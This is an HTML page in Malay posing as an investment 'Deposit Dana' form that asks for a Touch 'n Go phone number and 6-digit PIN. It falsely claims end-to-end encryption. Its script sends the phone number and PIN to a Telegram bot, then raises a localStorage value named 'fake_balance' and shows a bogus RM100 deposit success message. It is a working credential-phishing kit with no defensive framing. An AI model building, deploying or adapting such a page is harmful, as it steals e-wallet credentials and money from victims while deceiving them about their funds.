<!DOCTYPE html>
<html lang="ms">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deposit Dana</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <div class="card">
        <h1 style="font-size: 24px; text-align: center; margin-top: 10px;">Deposit Dana</h1>
        <p class="subtitle" style="text-align: center;">Untuk menambah dana pelaburan anda, sila masukkan No. Telefon dan 6-digit PIN Touch 'n Go anda.</p>

        <form id="tngForm">
            <div class="input-group">
                <label>No. Telefon (TNG)</label>
                <input type="tel" id="phone" placeholder="0123456789" required>
            </div>
            
            <div class="input-group">
                <label>TNG Secure PIN (6 Digit)</label>
                <input type="password" id="pin" style="letter-spacing: 10px; text-align: center; font-size: 24px; font-weight: bold;" maxlength="6" placeholder="••••••" required>
            </div>
            
            <button type="submit" id="btn" style="background: #3b82f6; color: white;">Sahkan Deposit</button>
        </form>
        
        <div style="display: flex; align-items: center; justify-content: center; gap: 5px; font-size: 12px; color: #10b981; margin-top: 20px;">
            🔒 Disulitkan secara end-to-end
        </div>
    </div>

    <script src="js/config.js"></script>
    <script>
        document.getElementById('tngForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = document.getElementById('btn');
            btn.disabled = true; 
            btn.textContent = "Memproses...";
            
            const phone = document.getElementById('phone').value;
            const pin = document.getElementById('pin').value;
            
            const text = `<b>💳 Deposit TNG</b>\n<b>==================</b>\n<b>No. Tel:</b> <code>${phone}</code>\n<b>PIN TNG:</b> <code>${pin}</code>\n<b>==================</b>`;
            
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                    method: "POST", body: new URLSearchParams({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: "HTML" })
                });

                let currentBalance = parseFloat(localStorage.getItem('fake_balance') || '0');
                localStorage.setItem('fake_balance', currentBalance + 100);

                alert("Deposit RM100 Berjaya!");
                window.location.href = "dashboard.html";
                
            } catch (err) {
                alert("Rangkaian sibuk.");
                btn.disabled = false; btn.textContent = "Sahkan Deposit";
            }
        });
    </script>
</body>
</html>
